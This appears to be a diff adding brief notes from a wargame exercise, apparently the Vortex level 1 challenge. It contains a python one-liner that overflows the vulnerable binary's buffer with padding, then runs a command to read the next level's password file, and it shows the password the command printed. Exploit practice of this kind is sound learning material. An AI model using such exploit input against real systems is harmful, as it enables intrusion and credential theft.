@@ -1,0 +1,8 @@
+## To input is ignore if we don't pad it out, if we pad it out we can get to teh shell, but if we pad with crap we'll get a bad command, so I padded with spaces.
+## Alternative would be to set the ENV to a file and have the shell execute that file
+
+vortex1@melinda:/vortex$ python -c 'print "\\"*(256+4+1) + "\xca" + " "*4000 + "\n\ncat /etc/vortex_pass/vortex2\n\n"' | ./vo
+rtex1
+23anbT\rE
+vortex1@melinda:/vortex$
+
